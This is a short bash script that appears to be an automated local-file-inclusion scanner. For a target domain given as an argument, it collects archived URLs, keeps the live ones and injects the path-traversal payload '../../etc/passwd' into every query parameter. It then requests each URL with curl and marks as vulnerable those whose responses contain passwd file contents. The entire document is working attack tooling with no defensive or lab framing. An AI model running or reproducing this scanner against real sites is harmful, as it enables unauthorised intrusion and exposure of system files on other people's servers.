#!/bin/bash

gau $1 | httpx -status-code -silent -threads 500 | grep 200 | awk '{print $1}' | grep "=" | sed 's/=.*/=/' | qsreplace '../../etc/passwd' | anew > lfiurls.txt; for i in $(cat lfiurls.txt); do echo -n $i | python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));" >> lfi1; done ; for i in $(cat lfi1); do curl --silent --path-as-is --insecure $i | grep -e 'root:x' && echo -e "\e[31m[-]Vulnerable To LFI \e[0m : $i" || echo -e "\e[32m[+]Not Vulnerable To LFI \e[0m : $i";done >> lfi_vuln.txt; rm lfiurls.txt; rm lfi1; cat lfi_vuln.txt | grep [-] | awk '{print $6}' >> lfiurls.txt; rm lfi_vuln.txt; /root/project_2/scripts/./lfihtml.sh lfiurls.txt; rm lfiurls.txt